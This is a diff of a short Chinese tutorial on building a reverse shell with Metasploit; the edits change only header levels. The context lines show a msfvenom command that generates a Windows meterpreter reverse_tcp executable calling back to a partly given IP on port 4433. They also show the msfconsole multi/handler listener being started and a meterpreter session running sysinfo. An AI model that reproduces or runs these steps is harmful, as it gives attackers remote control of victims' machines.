@@ -1,7 +1,7 @@
 # msf制作shell
 
 
-# 1 .制作反弹shell-exe文件
+#### 1 .制作反弹shell-exe文件
 
 执行命令
 ```
@@ -14,7 +14,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=2x.94.50.153 LPORT=4433 -f exe
 
 > `4433.exe`为生成文件
 
-# 2.控制端启动msfconsole，获取监听
+##### 2.控制端启动msfconsole，获取监听
 
 运行命令
 
@@ -29,7 +29,7 @@ msf5 exploit(multi/handler) > run
 
 ```
 
-# 3.反弹成功
+##### 3.反弹成功
 
 ```
 meterpreter > sysinfo
